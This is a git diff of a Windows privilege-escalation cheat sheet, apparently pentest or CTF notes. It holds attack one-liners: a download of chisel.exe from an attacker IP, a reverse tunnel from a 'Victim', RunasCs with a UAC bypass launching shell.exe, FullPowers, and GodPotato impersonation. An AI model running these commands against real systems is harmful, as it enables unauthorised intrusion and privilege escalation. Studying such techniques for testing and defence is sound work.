@@ -10,7 +10,6 @@ title: Windows
 - [hacktricks (windows)](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
 
 ## Basic Enum
-
 ### Powershell
 ```powershell
 # System info
@@ -52,7 +51,6 @@ Get-CimInstance -ClassName Win32_Product | Select-Object Name, Version
 ```
 
 ## Utils
-
 ### Powershel http fetch
 ```powershell
 Invoke-WebRequest -Uri "http://10.10.10.10:8000/chisel.exe" -OutFile "chisel.exe"
@@ -64,5 +62,31 @@ Invoke-WebRequest -Uri "http://10.10.10.10:8000/chisel.exe" -OutFile "chisel.exe
 chisel server -p 8000 --reverse
 
 # Victim
-chisel client http://x.x.x.x:8000 R:9200:localhost:9200
+chisel client http://x.x.x.x:8000 R:9200:127.0.0.1:9200
+```
+
+## runas
+```batch
+runas /user:Administrator cmd.exe
+```
+### RunasCs
+- [RunasCs](https://github.com/antonioCoco/RunasCs)
+```powershell
+.\RunasCs.exe user password "shell.exe" --bypass-uac --logon-type 8
+```
+
+## FullPowers
+When `LocalService` or `NetworkService`
+- [Fullpowers](https://github.com/itm4n/FullPowers)
+
+```powershell
+.\FullPowers.exe -x
+```
+
+## GodPotato
+When `ImpersonatePrivilege`
+- [GodPotato](https://github.com/BeichenDream/GodPotato)
+
+```powershell
+.\GodPotato.exe -cmd "cmd /c whoami"
 ```
